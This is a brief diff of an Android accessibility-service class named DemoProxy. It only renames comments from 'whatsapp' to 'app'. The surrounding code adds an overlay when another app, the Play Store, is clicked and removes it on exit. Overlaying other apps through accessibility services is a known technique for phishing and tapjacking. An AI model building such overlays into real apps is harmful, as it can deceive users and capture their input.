@@ -97,7 +97,7 @@ public class DemoProxy extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
 
 
-        //<-------------------------------  remove overlay after exiting whatsapp  ----------------------------->
+        //<-------------------------------  remove overlay after exiting app  ----------------------------->
 
         if (!event.getPackageName().equals("com.android.vending")) {
             if (overlay != null) {
@@ -120,7 +120,7 @@ public class DemoProxy extends AccessibilityService {
             return;
         }
 
-        //<-------------------------------  add overlay to whatsapp ---------------------------------------->
+        //<-------------------------------  add overlay to app ---------------------------------------->
 
         if (event.getPackageName().equals("com.android.vending")) {
             if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
